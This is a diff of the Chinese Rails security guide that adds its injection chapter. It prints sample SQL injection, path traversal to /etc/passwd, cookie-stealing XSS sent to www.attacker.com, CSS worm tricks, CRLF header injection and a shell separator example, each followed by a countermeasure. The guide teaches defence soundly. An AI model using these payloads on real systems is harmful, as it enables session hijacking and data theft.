@@ -332,9 +332,9 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
 
 NOTE: 请确保文件上传时不会覆盖重要文件，同时对于媒体文件应该采用异步上传方式。
 
-很多 Web 应用都允许用户上传文件。由于文件名通常由用户指定（或部分指定），必须对文件名进行过滤，以防止攻击者通过指定恶意文件名覆盖服务器上的文件。如果我们把上传的文件储存在 `/var/www/uploads` 文件夹中，而用户输入了类似 `"../../../etc/passwd"` 的文件名，在没有对文件名进行过滤的情况下，`passwd` 这个重要文件就有可能被覆盖。当然，只有在 Ruby 解析器具有足够权限时文件才会被覆盖，这也是不应该使用 Unix 特权用户运行 Web 服务器、数据库服务器和其他应用的原因之一。
+很多 Web 应用都允许用户上传文件。由于文件名通常由用户指定（或部分指定），必须对文件名进行过滤，以防止攻击者通过指定恶意文件名覆盖服务器上的文件。如果我们把上传的文件储存在 `/var/www/uploads` 文件夹中，而用户输入了类似 `../../../etc/passwd` 的文件名，在没有对文件名进行过滤的情况下，`passwd` 这个重要文件就有可能被覆盖。当然，只有在 Ruby 解析器具有足够权限时文件才会被覆盖，这也是不应该使用 Unix 特权用户运行 Web 服务器、数据库服务器和其他应用的原因之一。
 
-在过滤用户输入的文件名时，不要去尝试删除文件名的恶意部分。我们可以设想这样一种情况，Web 应用把文件名中所有的 `"../"` 都删除了，但攻击者使用的是 `"....//"` 这样的字符串，于是过滤后的文件名中仍然包含 `"../"`。最佳策略是使用白名单，只允许在文件名中使用白名单中的字符。黑名单的做法是尝试删除禁止使用的字符，白名单的做法恰恰相反。对于无效的文件名，可以直接拒绝（或者把禁止使用的字符都替换掉），但不要尝试删除禁止使用的字符。下面这个文件名净化程序来自 link:$$https://github.com/technoweenie/attachment_fu/tree/master$$[attachment_fu] 插件：
+在过滤用户输入的文件名时，不要去尝试删除文件名的恶意部分。我们可以设想这样一种情况，Web 应用把文件名中所有的 `../` 都删除了，但攻击者使用的是 `....//`，于是过滤后的文件名中仍然包含 `../`。最佳策略是使用白名单，只允许在文件名中使用白名单中的字符。黑名单的做法是尝试删除禁止使用的字符，白名单的做法恰恰相反。对于无效的文件名，可以直接拒绝（或者把禁止使用的字符都替换掉），但不要尝试删除禁止使用的字符。下面这个文件名净化程序来自 link:$$https://github.com/technoweenie/attachment_fu/tree/master$$[attachment_fu] 插件：
 
 [source,ruby]
 ----
@@ -359,7 +359,7 @@ end
 
 WARNING: 如果把上传的文件储存在某些特定的文件夹中，文件中的源代码就有可能被执行。因此，如果 Rails 应用的 `/public` 文件夹被设置为 Apache 的主目录，请不要在这个文件夹中储存上传的文件。
 
-流行的 Apache Web 服务器的配置文件中有一个名为 `DocumentRoot` 的选项，用于指定网站的主目录。主目录及其子文件夹中的所有内容都由 Web 服务器直接处理。如果其中包含了一些具有特定扩展名的文件，就能够通过 HTTP 请求执行这些文件中的代码（可能还需要设置一些选项），例如 PHP 和 CGI 文件。假设攻击者上传了 `"file.cgi"` 文件，其中包含了可执行代码，那么之后有人下载这个文件时，这些代码就会在服务器上执行。
+流行的 Apache Web 服务器的配置文件中有一个名为 `DocumentRoot` 的选项，用于指定网站的主目录。主目录及其子文件夹中的所有内容都由 Web 服务器直接处理。如果其中包含了一些具有特定扩展名的文件，就能够通过 HTTP 请求执行这些文件中的代码（可能还需要设置一些选项），例如 PHP 和 CGI 文件。假设攻击者上传了 `file.cgi` 文件，其中包含了可执行代码，那么之后有人下载这个文件时，这些代码就会在服务器上执行。
 
 如果 Apache 的 `DocumentRoot` 选项指向 Rails 的 `/public` 文件夹，请不要在其中储存上传的文件，至少也应该储存在子文件夹中。
 
@@ -375,7 +375,7 @@ NOTE: 请确保用户不能随意下载文件。
 send_file('/var/www/uploads/' + params[:filename])
 ----
 
-可以看到，只要指定 `"../../../etc/passwd"` 这样的文件名，用户就可以下载服务器登录信息。对此，一个简单的解决方案是，检查所请求的文件是否在规定的文件夹中：
+可以看到，只要指定 `../../../etc/passwd` 这样的文件名，用户就可以下载服务器登录信息。对此，一个简单的解决方案是，检查所请求的文件是否在规定的文件夹中：
 
 [source,ruby]
 ----
@@ -399,7 +399,7 @@ send_file filename, disposition: 'inline'
 
 在局域网和管理界面中，只要有一个地方没有对输入进行过滤，整个应用就有可能受到 XSS 攻击。可能发生的攻击包括：窃取具有特权的管理员的 Cookie，注入 iframe 以窃取管理员密码，以及通过浏览器漏洞安装恶意软件以控制管理员的计算机。
 
-关于 XSS 攻击的对策，请参阅<<security#injection,注入>>一节。在局域网和管理界面中同样推荐使用 `SafeErb` 插件。
+关于 XSS 攻击的对策，请参阅<<security#injection,注入攻击>>一节。在局域网和管理界面中同样推荐使用 `SafeErb` 插件。
 
 **CSRF** 跨站请求伪造（CSRF），也称为跨站引用伪造（XSRF），是一种破坏性很强的攻击方法，它允许攻击者完成管理员或局域网用户可以完成的一切操作。前文我们已经介绍过 CSRF 的工作原理，下面是攻击者针对局域网和管理界面发动 CSRF 攻击的几个例子。
 
@@ -614,4 +614,424 @@ WARNING: 只需纂改一个参数，就有可能使用户获得未经授权的�
 通过混淆参数或 JavaScript 来实现安全性一点儿也不可靠。通过 Mozilla Firefox 的 Web 开发者工具栏，我们可以查看和修改表单的隐藏字段。JavaScript 常用于验证用户输入数据，但无法防止攻击者发送带有不合法数据的恶意请求。Mozilla Firefox 的 Live Http Headers 插件，可以记录每次请求，而且可以重复发起并修改这些请求，这样就能轻易绕过 JavaScript 验证。还有一些客户端代理，允许拦截进出的任何网络请求和响应。
 
 [[injection]]
-=== 注入
+=== 注入攻击
+
+TIP: 注入这种攻击方式，会把恶意代码或参数写入 Web 应用，以便在应用的安全上下文中执行。注入攻击最著名的例子是跨站脚本（XSS）和 SQL 注入攻击。
+
+注入攻击非常复杂，因为相同的代码或参数，在一个上下文中可能是恶意的，但在另一个上下文中可能完全无害。这里的上下文指的是脚本、查询或编程语言，Shell 或 Ruby/Rails 方法等等。下面几节将介绍可能发生注入攻击的所有重要场景。不过第一节我们首先要介绍，面对注入攻击时如何进行综合决策。
+
+[[whitelists-versus-blacklists]]
+==== 白名单 vs 黑名单
+
+NOTE: 对于净化、保护和验证操作，白名单优于黑名单。
+
+黑名单可以包含垃圾电子邮件地址、非公开的控制器动作、造成安全威胁的 HTML 标签等等。与此相反，白名单可以包含可靠的电子邮件地址、公开的控制器动作、安全的 HTML 标签等等。尽管有些情况下我们无法创建白名单（例如在垃圾信息过滤器中），但只要有可能就应该优先使用白名单：
+
+* 对于安全相关的控制器动作，在 `before_action` 选项中用 `except: [...]` 代替 `only: [...]`，这样就不会忘记为新建动作启用安全检查；
+* 为防止跨站脚本（XSS）攻击，应允许使用 `<strong>` 标签，而不是去掉 `<script>` 标签，详情请参阅后文；
+* 不要尝试通过黑名单来修正用户输入：
+    ** 否则攻击者可以发起 `"<sc<script>ript>".gsub("<script>", "")` 这样的攻击；
+    ** 对于非法输入，直接拒绝即可。
+
+使用黑名单时有可能因为人为因素造成遗漏，使用白名单则能有效避免这种情况。
+
+[[sql-jnjection]]
+==== SQL 注入
+
+TIP: Rails 为我们提供的方法足够智能，绝大多数情况下都能防止 SQL 注入。但对 Web 应用而言，SQL 注入是常见并具有毁灭性的攻击方式，因此了解这种攻击方式十分重要。
+
+[[introduction]]
+===== 简介
+
+SQL 注入攻击的原理是，通过纂改传入 Web 应用的参数来影响数据库查询。SQL 注入攻击的一个常见目标是绕过授权，另一个常见目标是执行数据操作或读取任意数据。下面的例子说明了为什么要避免在查询中使用用户输入数据：
+
+[source,ruby]
+----
+Project.where("name = '#{params[:name]}'")
+----
+
+这个查询可能出现在搜索动作中，用户会输入想要查找的项目名称。如果恶意用户输入 `' OR 1 --`，将会生成下面的 SQL 查询：
+
+[source,sql]
+----
+SELECT * FROM projects WHERE name = '' OR 1 --'
+----
+
+其中 `--` 表示注释开始，之后的所有内容都会被忽略。这个查询执行后，将会返回项目数据表中的所有记录，也包括当前用户不应该看到的记录，原因是所有记录都满足查询条件。
+
+[[bypassing-authorization]]
+===== 绕过授权
+
+通常 Web 应用都包含访问控制。用户输入登录的账号密码，Web 应用会尝试在用户数据表中查找匹配的记录。如果找到了，应用就会授权用户登录。但是，攻击者通过 SQL 注入，有可能绕过这项检查。下面的例子是 Rails 中一个常见的数据库查询，用于在用户数据表中查找和用户输入的账号密码相匹配的第一条记录。
+
+[source,ruby]
+----
+User.first("login = '#{params[:name]}' AND password = '#{params[:password]}'")
+----
+
+如果攻击者输入 `' OR '1'='1` 作为用户名，输入 `' OR '2'>'1` 作为密码，将会生成下面的 SQL 查询：
+
+[source,sql]
+----
+SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
+----
+
+这个查询执行后，会返回用户数据表的第一条记录，并授权用户登录。
+
+[[unauthorized-reading]]
+===== 未经授权读取数据
+
+UNION 语句用于连接两个 SQL 查询，并以集合的形式返回查询结果。攻击者利用 UNION 语句，可以从数据库中读取任意数据。还以前文的这个例子来说明：
+
+[source,ruby]
+----
+Project.where("name = '#{params[:name]}'")
+----
+
+通过 UNION 语句，攻击者可以注入另一个查询：
+
+----
+') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
+----
+
+结果会生成下面的 SQL 查询：
+
+[source,sql]
+----
+SELECT * FROM projects WHERE (name = '') UNION
+  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
+----
+
+这个查询执行后，得到的查询结果不是项目列表（因为不存在名称为空的项目），而是用户名密码的列表。如果发生这种情况，我们只能祈祷数据库中的用户密码都是加密的了！攻击者需要解决的唯一问题是，两个查询中字段的数量必须相等，本例中第二个查询中的多个 1 正是为了解决这个问题。
+
+此外，第二个查询还通过 `AS` 语句对某些字段进行了重命名，这样 Web 应用就会显示从用户数据表中查询到的数据。出于安全考虑，请把 Rails 升级至 link:$$http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/$$[2.1.1 或更高版本]。
+
+[[countermeasures]]
+===== 对策
+
+Ruby on Rails 内置了针对特殊 SQL 字符的过滤器，用于转义 `'`、`"`、`NULL` 和换行符。当我们使用 `Model.find(id)` 和 `Model.find_by_something(something)` 方法时，Rails 会自动应用这个过滤器。但在 SQL 片段中，尤其是在条件片段（`where("...")`）中，需要为 `connection.execute()` 和 `Model.find_by_sql()` 方法手动应用这个过滤器。
+
+为了净化受污染的字符串，在提供查询条件的选项时，我们应该传入数组而不是直接传入字符串：
+
+[source,ruby]
+----
+Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
+----
+
+如上所示，数组的第一个元素是包含问号的 SQL 片段，从第二个元素开始都是需要净化的变量，净化后的变量值将用于代替 SQL 片段中的问号。我们也可以传入散列来实现相同效果：
+
+[source,ruby]
+----
+Model.where(login: entered_user_name, password: entered_password).first
+----
+
+只有在模型实例上，才能通过数组或散列指定查询条件。对于其他情况，我们可以使用 `sanitize_sql()` 方法。遇到需要在 SQL 中使用外部字符串的情况时，请养成考虑安全问题的习惯。
+
+[[cross-site-scripting-xss]]
+==== 跨站脚本（XSS）
+
+TIP: 对于 Web 应用而言，XSS 是影响范围最广、破坏性最大的安全漏洞。这种恶意攻击方式会在客户端注入可执行代码。Rails 提供了用于防御这种攻击的辅助方法。
+
+[[entry-points]]
+===== 切入点
+
+存在安全风险的 URL 及其参数，是攻击者发动攻击的切入点。
+
+最常见的切入点包括帖子、用户评论和留言本，但项目名称、文档名称和搜索结果同样存在安全风险，实际上凡是用户能够输入信息的地方都存在安全风险。而且，输入不仅来自网站上的输入框，也可能来自 URL 参数（公开参数、隐藏参数或内部参数）。记住，用户有可能拦截任何通信。通过 link:$$http://livehttpheaders.mozdev.org/$$[Firefox 的  Live HTTP Headers 插件] 这样的工具或者客户端代理，用户可以轻易修改请求数据。
+
+XSS 攻击的工作原理是：攻击者注入代码，Web 应用保存并在页面中显示这些代码，受害者访问包含恶意代码的页面。本文给出的 XSS 的例子大多数只是显示一个警告框，但 XSS 的威力实际上要大得多。XSS 可以窃取 Cookie，劫持会话，把受害者重定向到假冒网站，植入攻击者的赚钱广告，纂改网站元素以窃取登录用户名和密码，以及通过 Web 浏览器的安全漏洞安装恶意软件。
+
+仅 2007 年下半年，在 Mozilla 浏览器中就发现了 88 个安全漏洞，Safari 浏览器 22 个， IE 浏览器 18个， Opera 浏览器 12个。link:$$http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf$$[赛门铁克《互联网安全威胁报告》]指出，仅 2007 年下半年，在浏览器插件中就发现了 239 个安全漏洞。link:$$http://pandalabs.pandasecurity.com/mpack-uncovered/$$[Mpack] 这个攻击框架非常活跃、经常更新，其作用是利用这些漏洞发起攻击。对于那些从事网络犯罪的黑客而言，利用 Web 应用框架中的 SQL 注入漏洞，在数据表的每个文本字段中插入恶意代码是非常有吸引力的。2008 年 4 月，超过 51 万个网站遭到了这类攻击，其中包括英国政府、联合国和其他一些重要网站。
+
+横幅广告是相对较新、不太常见的切入点。link:$$http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/$$[趋势科技]指出，2008年早些时候，在流行网站（如 MySpace 和 Excite）的横幅广告中出现了恶意代码。
+
+[[html-javascript-injection]]
+===== HTML / JavaScript 注入
+
+XSS 最常用的语言非 JavaScript （最受欢迎的客户端脚本语言）莫属，并且经常与 HTML 结合使用。因此，对用户输入进行转义是必不可少的安全措施。
+
+让我们看一个 XSS 的例子：
+
+[source,html]
+----
+<script>alert('Hello');</script>
+----
+
+这行 JavaScript 代码仅仅显示一个警告框。下面的例子作用完全相同，只不过其用法不太常见：
+
+[source,html]
+----
+<img src=javascript:alert('Hello')>
+<table background="javascript:alert('Hello')">
+----
+
+[[cookie-theft]]
+====== 窃取 Cookie
+
+到目前为止，本文给出的几个例子都不会造成实际危害，接下来，我们要看看攻击者如何窃取用户的 Cookie（进而劫持用户会话）。在 JavaScript 中，可以使用 `document.cookie` 属性来读写文档的 Cookie。JavaScript 遵循同源原则，这意味着一个域名上的脚本无法访问另一个域名上的 Cookie。`document.cookie` 属性中保存的是相同域名 Web 服务器上的 Cookie，但只要把代码直接嵌入 HTML 文档（就像 XSS 所做的那样），就可以读写这个属性了。把下面的代码注入自己的 Web 应用的任何页面，我们就可以看到自己的 Cookie：
+
+[source,html]
+----
+<script>document.write(document.cookie);</script>
+----
+
+当然，这样的做法对攻击者来说并没有意义，因为这只会让受害者看到自己的 Cookie。在接下来的例子中，我们会尝试从 pass:[http://www.attacker.com/] 这个 URL 地址加载图片和 Cookie。当然，因为这个 URL 地址并不存在，所以浏览器什么也不会显示。但攻击者能够通过这种方式，查看 Web 服务器的访问日志文件，从而看到受害者的 Cookie。
+
+[source,html]
+----
+<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
+----
+
+pass:[www.attacker.com] 的日志文件中将出现类似这样的一条记录：
+
+----
+GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
+----
+
+在 Cookie 中添加 `httpOnly` 标志可以显式规避这种攻击，这个标志可以禁止 JavaScript 读取 `document.cookie` 属性。IE v6.SP1、 Firefox v2.0.0.5 和 Opera 9.5 以及更高版本的浏览器都支持 `httpOnly` 标志，Safari 浏览器也在考虑支持这个标志。但其他浏览器（如 WebTV）或旧版浏览器（如 Mac 版 IE 5.5）不支持这个标志，因此遇到上述攻击时会导致网页无法加载。需要注意的是，即便设置了 `httpOnly` 标志，通过 link:$$https://www.owasp.org/index.php/HTTPOnly#Browsers_Supporting_HttpOnly$$[Ajax] 仍然可以读取 Cookie。
+
+[[defacement]]
+====== 涂改信息
+
+通过涂改网页信息，攻击者可以做很多事情，例如，显示虚假信息，或者诱使受害者访问攻击者的网站以窃取受害者的 Cookie、登录用户名和密码或其他敏感信息。最常见的信息涂改方式是通过 iframe 加载外部代码：
+
+[source,html]
+----
+<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
+----
+
+这行代码可以从外部网站加载任何 HTML 和 JavaScript 代码并嵌入当前网站，代码来自黑客使用 link:$$http://isc.sans.org/diary.html?storyid=3015$$[Mpack 攻击框架] 攻击某个意大利网站的真实案例。Mpack 会尝试利用 Web 浏览器的安全漏洞安装恶意软件，成功率高达 50%。
+
+更专业的攻击可以覆盖整个网站，也可以显示一个和原网站看起来一模一样的表单，并把受害者的用户名密码发送到攻击者的网站，还可以使用 CSS 和 JavaScript 隐藏原网站的正常链接并显示另一个链接，以便把用户重定向到假冒网站上。
+
+反射式注入攻击不需要储存恶意代码并将其显示给用户，而是直接把恶意代码包含在 URL 地址中。当搜索表单无法转义搜索字符串时，特别容易发起这种攻击。例如，访问下面这个链接，打开的页面会显示，“乔治·布什任命一名 9 岁男孩担任议长……”（译者注：此链接已失效，应该是网站修复了这个安全漏洞）：
+
+----
+http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
+  <script src=http://www.securitylab.ru/test/sc.js></script><!--
+----
+
+[[countermeasures]]
+====== 对策
+
+TIP: 过滤恶意输入非常重要，但是转义 Web 应用的输出同样也很重要。
+
+尤其对于 XSS，重要的是使用白名单而不是黑名单进行输入过滤。白名单过滤规定允许输入的值，反之，黑名单过滤规定不允许输入的值。经验告诉我们，黑名单永远做不到万无一失。
+
+假设我们通过黑名单从用户输入中删除 `script`，如果攻击者注入 `<scrscriptipt>`，过滤后就能得到 `<script>`。Rails 的早期版本在 `strip_tags()`、`strip_links()` 和 `sanitize()` 方法中使用了黑名单，因此有可能受到下面这样的注入攻击：
+
+[source,ruby]
+----
+strip_tags("some<<b>script>alert('hello')<</b>/script>")
+----
+
+这行代码会返回 `some<script>alert('hello')</script>`，也就是说攻击者可以发起注入攻击。这个例子说明了为什么白名单比黑名单更好。Rails 2 及更高版本中使用了白名单，下面是使用新版 `sanitize()` 方法的例子：
+
+[source,ruby]
+----
+tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
+s = sanitize(user_input, tags: tags, attributes: %w(href title))
+----
+
+通过规定允许使用的标签，`sanitize()` 完美地完成了过滤输入的任务。不管攻击者使出什么样的花招、设计出多么畸型的标签，都难逃被过滤的命运。
+
+接下来应该转义应用的所有输出，特别是在需要显示未经过滤的用户输入时（例如前面提到的的搜索表单的例子）。使用 `escapeHTML()` 方法（或其别名 `h()` 方法），把 HTML 中的字符 `&`、`"`、`<` 和 `>` 替换为对应的转义字符 `&amp;`、`&quot;`、`&lt;` 和 `&gt;`。然而作为程序员，我们往往很容易忘记这项工作，因此推荐使用 `SafeErb` 这个 gem，它会提醒我们转义来自外部的字符串。
+
+[[obfuscation-and-encoding-injection]]
+====== 混淆和编码注入
+
+早先的网络流量主要基于有限的西文字符，后来为了传输其他语言的字符，出现了新的字符编码，例如 Unicode。这也给 Web 应用带来了安全威胁，因为恶意代码可以隐藏在不同的字符编码中。Web 浏览器通常可以处理不同的字符编码，但 Web 应用往往不行。下面是通过 UTF-8 编码发动攻击的例子：
+
+[source,html]
+----
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
+  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+----
+
+上述代码运行后会弹出一个消息框。不过，前面提到的 `sanitize()` 过滤器能够识别此类代码。link:$$https://hackvertor.co.uk/public$$[Hackvertor] 是用于字符串混淆和编码的优秀工具，了解这个工具可以帮助我们知己知彼。Rails 提供的 `sanitize()` 方法能够有效防御编码注入攻击。
+
+[[examples-from-the-underground]]
+====== 真实案例
+
+TIP: 为了了解当前针对 Web 应用的攻击方式，最好看几个真实案例。
+
+下面的代码摘录自 link:$$http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1$$[Js.Yamanner@m] 制作的雅虎邮件link:$$http://groovin.net/stuff/yammer.txt$$[蠕虫]。该蠕虫出现于 2006 年 6 月 11 日，是首个针对网页邮箱的蠕虫：
+
+----
+<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
+  target=""onload="var http_request = false;    var Email = '';
+  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
+----
+
+该蠕虫利用了雅虎 HTML/JavaScript 过滤器的漏洞，这个过滤器用于过滤 HTML 标签中的所有 `target` 和 `onload` 属性（原因是这两个属性的值可以是 JavaScript）。因为这个过滤器只会执行一次，上述例子中 `onload` 属性中的蠕虫代码并没有被过滤掉。这个例子很好地诠释了黑名单永远做不到万无一失，也说明了 Web 应用为什么通常都会禁止 HTML/JavaScript 输入。
+
+另一个用于概念验证的网页邮箱蠕虫是 Ndjua，这是一个针对四个意大利网页邮箱服务的跨域名蠕虫。更多介绍请参阅link:$$http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/$$[Rosario Valotta 的论文]。刚刚介绍的这两个蠕虫，其目的都是为了搜集电子邮件地址，一些从事网络犯罪的黑客可以利用这些邮件地址获取非法收益。
+
+2006 年 12月，在一次link:$$http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html$$[针对 MySpace 的钓鱼攻击]中，黑客窃取了 34,000 个真实用户名和密码。这次攻击的原理是，创建名为“login_home_index_html”的个人信息页面，并使其 URL 地址看起来十分正常，同时通过精心设计的 HTML 和 CSS，隐藏 MySpace 的真正内容，并显示攻击者创建的登录表单。
+
+[[css-injection]]
+==== CSS 注入
+
+TIP: CSS 注入实际上是 JavaScript 注入，因为有的浏览器（如 IE、某些版本的 Safari 和其他浏览器）允许在 CSS 中使用 JavaScript。因此，在允许 Web 应用使用自定义 CSS 时，请三思而后行。
+
+著名的 link:$$http://namb.la/popular/tech.html$$[MySpace Samy 蠕虫]是解释 CSS 注入攻击原理的最好例子。这个蠕虫只需访问用户的个人信息页面就能向 Samy（攻击者）发送好友请求。在短短几个小时内，Samy 就收到了超过一百万个好友请求，巨大的流量致使 MySpace 宕机。下面我们从技术角度来分析这个蠕虫。
+
+MySpace 禁用了很多标签，但允许使用 CSS。因此，蠕虫的作者通过下面这种方式把 JavaScript 值入 CSS 中：
+
+[source,html]
+----
+<div style="background:url('javascript:alert(1)')">
+----
+
+这样 `style` 属性就成为了恶意代码。在这段恶意代码中，不允许使用单引号和多引号，因为这两种引号都已经使用了。但是在 JavaScript 中有一个好用的 `eval()` 函数，可以把任意字符串作为代码来执行。
+
+[source,html]
+----
+<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
+----
+
+`eval()` 函数是黑名单输入过滤器的噩梦，它使 `innerHTML` 这个词得以藏身 `style` 属性之中：
+
+[source,javascript]
+----
+alert(eval('document.body.inne' + 'rHTML'));
+----
+
+下一个问题是，MySpace 会过滤 `javascript` 这个词，因此作者使用 `java<NEWLINE>script` 来绕过这一限制：
+
+[source,html]
+----
+<div id="mycode" expr="alert('hah!')" style="background:url('java↵ 
+script:eval(document.all.mycode.expr)')">
+----
+
+<<security#cross-site-request-forgery-csrf,CSRF 安全令牌>>是蠕虫作者面对的另一个问题。如果没有令牌，就无法通过 POST 发送好友请求。解决方案是，在添加好友前先向用户的个人信息页面发送 GET 请求，然后分析返回结果以获取令牌。
+
+最后，蠕虫作者完成了一个大小为 4KB 的蠕虫，他把这个蠕虫注入了自己的个人信息页而。
+
+对于 Gecko 内核的浏览器（例如 Firefox），link:$$http://www.securiteam.com/securitynews/5LP051FHPE.html$$[moz-binding] CSS 属性也已被证明可用于把 JavaScript 植入 CSS 中。
+
+[[countermeasures]]
+===== 对策
+
+这个例子再次说明，黑名单永远做不到万无一失。不过，在 Web 应用中使用自定义 CSS 是一个非常罕见的特性，为这个特性编写好用的 CSS 白名单过滤器可能会很难。如果想要允许用户自定义颜色或图片，我们可以让用户在 Web 应用中选择所需的颜色或图片，然后自动生成对应的 CSS。如果确实需要编写 CSS 白名单过滤器，可以参照 Rails 提供的 `sanitize()` 进行设计。
+
+[[textile-injection]]
+==== Textile 注入
+
+基于安全考虑，我们可能想要用其他文本格式（标记语言）来代替 HTML，然后在服务器端把所使用的标记语言转换为 HTML。link:$$http://redcloth.org/$$[RedCloth] 是一种可以在 Ruby 中使用的标记语言，但在不采取预防措施的情况下，这种标记语言同样存在受到 XSS 攻击的风险。
+
+例如，RedCloth 会把 `_test_` 转换为 `<em>test<em>`，以支持斜体。但直到最新的 3.0.4 版，这一特性都存在受到 XSS 攻击的风险。全新的第 4 版已经移除了这一严重的安全漏洞。然而即便是第 4 版也存在link:$$http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html$$[一些安全漏洞]，仍有必要采取预防措施。下面给出了针对 3.0.4 版的例子：
+
+[source,ruby]
+----
+RedCloth.new('<script>alert(1)</script>').to_html
+# => "<script>alert(1)</script>"
+----
+
+使用 `:filter_html` 选项可以移除并非由 Textile 处理器创建的 HTML：
+
+[source,ruby]
+----
+RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
+# => "alert(1)"
+----
+
+不过，这个选项不会过滤所有的 HTML，RedCloth 的作者在设计时有意保留了一些标签，例如 `<a>`：
+
+[source,ruby]
+----
+RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
+# => "<p><a href="javascript:alert(1)">hello</a></p>"
+----
+
+[[countermeasures]]
+===== 对策
+
+建议将 RedCloth 和白名单输入过滤器结合使用，具体操作请参考 XSS 一节的对策部分。
+
+[[ajax-injection]]
+==== Ajax 注入
+
+NOTE: 对于 Ajax 动作，必须采取和常规控制器动作一样的安全预防措施。不过，至少存在一个例外：如果动作不需要渲染视图，那么在控制器中就应该进行转义。
+
+如果使用了 link:$$https://rubygems.org/gems/in_place_editing$$[in_place_editor] 插件，或者控制器动作只返回字符串而不渲染视图，我们就应该在动作中对返回值进行转义。否则，一旦返回值中包含 XSS 字符串，这些恶意代码就会在发送到浏览器时执行。请使用 `h()` 方法对所有输入值进行转义。
+
+[[command-line-injection]]
+==== 命令行注入
+
+NOTE: 请谨慎使用用户提供的命令行参数。
+
+如果应用需要在底层操作系统中执行命令，那么可以使用 Ruby 提供的几个方法：`exec(command)`、`syscall(command)`、`system(command)` 和 `command`。如果整条命令或命令的某一部分是由用户输入的，我们就必须特别小心。这是因为在大多数 Shell 中，可以通过分号（`;`）或竖线（`|`）把几条命令连接起来，这些命令会按顺序执行。
+
+为了防止这种情况，我们可以使用 `system(command, parameters)` 方法，通过这种方式传递命令行参数更安全。
+
+[source,ruby]
+----
+system("/bin/echo","hello; rm *")
+# 打印 "hello; rm *" 而不会删除文件
+----
+
+[[header-injection]]
+==== 头信息注入
+
+WARNING: HTTP 请求头是动态生成的，因此在某些情况下可能会包含用户注入的信息，从而导致错误重定向，XSS 或 HTTP 响应拆分（HTTP response splitting）。
+
+HTTP 请求头中包含 Referer，User-Agent（客户端软件）和 Cookie 等字段。响应头中包含状态码、Cookie 和 Location（重定向目标 URL）等字段。这些字段都是由用户提供的，用户可以想办法修改。因此，别忘了对这些头信息字段进行转义，例如在管理页面中显示 User-Agent 时。
+
+除此之外，在部分基于用户输入创建响应头时，知道自己在做什么很重要。例如，为表单添加 `referer` 字段，由用户指定 URL 地址，以便把用户重定向到指定页面：
+
+[source,ruby]
+----
+redirect_to params[:referer]
+----
+
+这行代码告诉 Rails 把用户提供的地址字符串放入头信息的 `Location` 字段，并向浏览器发送 302（重定向）状态码。于是，恶意用户可以这样做：
+
+----
+http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
+----
+
+由于 Rails 2.1.2 之前的版本的 Bug，黑客可以在头信息中注入任意字段，例如：
+
+----
+http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
+http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
+----
+
+注意，`%0d%0a` 是 URL 编码后的 `\r\n`，也就是 Ruby 中的回车换行符（CRLF）。因此，上述第二个例子得到的 HTTP 头信息如下（第二个 Location 覆盖了第一个 Location）：
+
+----
+HTTP/1.1 302 Moved Temporarily
+(...)
+Location: http://www.malicious.tld
+----
+
+通过这些例子我们看到，头信息注入攻击的原理是在头信息字段中注入回车换行符。通过错误重定向，攻击者可以把用户重定向到钓鱼网站，在一个和正常网站看起来完全一样的页面中要求用户再次登录，从而窃取登录的用户名密码。攻击者还可以通过浏览器安全漏洞安装恶意软件。Rails 2.1.2 的 `redirect_to` 方法对 Location 字段的值进行了转义。当我们使用用户输入创建其他头信息字段时，需要手动进行转义。
+
+[[response-splitting]]
+===== 响应拆分
+
+既然存在头信息注入的可能性，自然也存在响应拆分的可能性。在 HTTP 响应中，头信息之后是两个回车换行符，然后是真正的数据（通常是 HTML）。响应拆分的工作原理是，在头信息中插入两个回车换行符，之后紧跟带有恶意 HTML 代码的另一个响应。这样，响应就变为：
+
+----
+HTTP/1.1 302 Found [First standard 302 response]
+Date: Tue, 12 Apr 2005 22:09:07 GMT
+Location: Content-Type: text/html
+
+
+HTTP/1.1 200 OK [Second New response created by attacker begins]
+Content-Type: text/html
+
+
+&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitrary malicious input is
+Keep-Alive: timeout=15, max=100         shown as the redirected page]
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html
+----
+
+在某些情况下，受到响应拆分攻击后，受害者接收到的是恶意 HTML 代码。不过，这种情况只会在保持活动的连接中发生，而很多浏览器都使用一次性连接。当然，我们不能指望通过浏览器的特性来防御这种攻击。这是一个严重的安全漏洞，正确的做法是把 Rails 升级到 2.0.5 和 2.1.2 及更高版本，这样才能消除头信息注入（和响应拆分）的风险。
+
+[[unsafe-query-generation]]
